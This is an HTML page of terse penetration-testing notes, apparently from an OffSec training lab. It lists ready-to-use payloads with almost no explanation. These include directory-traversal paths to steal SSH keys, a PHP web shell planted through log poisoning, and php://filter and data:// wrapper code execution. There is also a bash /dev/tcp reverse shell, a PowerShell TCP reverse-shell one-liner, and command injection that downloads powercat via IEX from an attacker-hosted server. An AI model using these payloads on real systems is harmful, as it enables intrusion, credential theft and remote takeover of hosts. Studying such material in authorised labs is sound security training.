<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>LF, Directory Traversal , PHP wrapper and Comand INjection</title>
</head><body><b>LFI and Directory Traversal</b><br/>
../../../../../../../../../home/offsec/.ssh/id_rsa &nbsp; {For Getting the SSH Keys}<br/>
<br/>
ssh -i dt_key -p 2222 offsec@mountaindesserts.com &nbsp; {connecting to ssh with user name}<br/>
chmod 400 dt_key { changing permissions}<br/>
<br/>
&lt;?php echo system($_GET['cmd']); ?&gt; &nbsp; <br/>
../../../../../../../../../var/log/apache2/access.log &nbsp; <br/>
<span style="font-family: gg sans"><span style="font-size: 14pt"><div style="text-align: left">../../../../../../../../../xampp\apache\logs/access.log&amp;cmd=</div></span></span>&nbsp; <br/>
<br/>
<b>PHP Wrappers<br/>
<br/>
</b>curl http://mountaindesserts.com/meteor/index.php?page=admin.php<br/>
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php<br/>
<b><br/>
PHP DATA Wrappers<br/>
</b>curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system('ls');?&gt;"<br/>
<br/>
echo -n '&lt;?php echo system($_GET["cmd"]);?&gt;' | base64<br/>
<br/>
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls"<br/>
<b><br/>
Webshells<br/>
</b>pwsh<br/>
<br/>
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.206%2F4444%200%3E%261%22 {for Linux}<br/>
&nbsp; &nbsp;<br/>
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.164",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' &nbsp; &nbsp;{reverse shell one liner for windows}<br/>
<br/>
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) &nbsp; <b><br/>
</b><b><br/>
</b>$EncodedText =[Convert]::ToBase64String($Bytes)<b><br/>
</b><b>&nbsp;<br/>
</b>$EncodedText<br/>
<br/>
<b>Command Injection<br/>
<br/>
</b>curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive<br/>
<br/>
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .<br/>
<br/>
python3 -m http.server 80<br/>
<br/>
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.232:8000%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.232%20-p%204444%20-e%20powershell' http://192.168.241.189:8000/archive <br/>
<br/>
</body></html>